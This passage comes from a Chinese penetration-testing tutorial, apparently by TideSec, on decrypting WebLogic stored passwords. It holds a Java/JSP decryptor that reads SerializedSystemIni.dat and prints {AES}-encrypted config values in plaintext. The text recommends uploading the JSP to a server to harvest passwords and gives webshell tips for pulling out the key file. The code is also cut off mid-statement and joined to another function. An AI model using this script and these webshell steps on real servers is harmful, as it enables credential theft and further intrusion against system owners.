    import javax.xml.parsers.*;
    import javax.xml.xpath.*;
    import org.w3c.dom.*;
    import weblogic.security.internal.*; // requires weblogic.jar in the class path
    import weblogic.security.internal.encryption.*;
    public class WebLogicDecryptor {
        private static final String PREFIX = "{AES}";
        private static final String XPATH_EXPRESSION = "//node()[starts-with(text(), '"
               + PREFIX + "')] | //@*[starts-with(., '" + PREFIX + "')]";
        private static ClearOrEncryptedService ces;
        public static void main(String[] args) throws Exception {
           if (args.length 
    出错了。。";
           }
           return result;
        }
    private static String processProperties(File file) 
    {
           String result = "";
           try{
               Properties properties = new Properties();
               properties.load(new FileInputStream(file));
               for (Map.Entry p : properties.entrySet()) {
                  if (p.getValue().toString().startsWith(PREFIX)) {
                      result = print(p.getKey(), p.getValue());
                  }
               }
           }catch (Exception e) {
                  result = "出错了。。";
           }
           return result;
    }
    private static String print(Object attributeName, Object encrypted)
    {
           String retStr = "Node name: " + attributeName +"";
           retStr += "Encrypted: " + encrypted + "";
           retStr += "Decrypted: " + ces.decrypt((String) encrypted );
           return retStr;
    }
    private static String getPassword()
    {
        String result = "";
        ces = new ClearOrEncryptedService(
                  SerializedSystemIni.getEncryptionService(new File(Secruity_path)
                         .getAbsolutePath()));
           File file = new File(Config_path);
           if (file.getName().endsWith(".xml")) {
               result = processXml(file);
           }
           else if (file.getName().endsWith(".properties")) {
               result = processProperties(file);
           }
        return result;
    }
    %>
## 解密方法7：服务端jsp解密2
jsp脚本解密，需要上传jsp文件到服务器，访问即可获取密码，简单粗暴，非常推荐！
适用场景：在服务器中上传jsp即可
操作难易：★
成功几率：★★★
推荐指数：★★★★★
相关工具：https://github.com/TideSec/Decrypt_Weblogic_Password/tree/master/Tools7-get_wls_pwd2
只需要把要解密的密文写在jsp文件中即可，上传服务器，访问后即得明文。
代码如下：
## 注意事项
1、如果AES加密后的密码为：{AES}Nu2LEjo0kxMEd4G5L9bYLE5wI5fztbgeRpFec9wsrcQ\=
破解时需要把后面的\给去掉，不然会执行报错。
2、有时候用webshell下载密钥SerializedSystemIni.dat文件后可能会和源文件不一致，从而导致解密失败，主要是因为SerializedSystemIni.dat文件为二进制文件，直接使用浏览器下载可能遭到破坏。
这时可以使用webshell执行tar命令，将SerializedSystemIni.dat文件打包后再下载或者使用Burpsuite的copy to
file来进行保存。
一般来说SerializedSystemIni.dat文件为64字节，如果大小和这个不符，那么你下载的密钥可能不是原始文件。
## 参考资料
weblogic密码加解密：https://blog.csdn.net/rznice/article/details/50906335
weblogic的boot.properties中密码破解：http://www.itpub.net/thread-1421403-1-1.html
Weblogic解密脚本（无需weblogic环境）：https://blog.csdn.net/qq_27446553/article/details/51013151
我们应该了解的JNDI数据源配置：https://www.freebuf.com/news/193304.html
破解weblogic(数据库)密码：https://www.cnblogs.com/holdon521/p/4110750.html
解密JBoss和Weblogic数据源连接字符串和控制台密码：http://drops.xmd5.com/static/drops/tips-349.html
解密WebLogic的密码：http://bobao.360.cn/learning/detail/337.html
## 关于我们
对web安全感兴趣的小伙伴可以关注团队官网: http://www.TideSec.com 或关注公众号：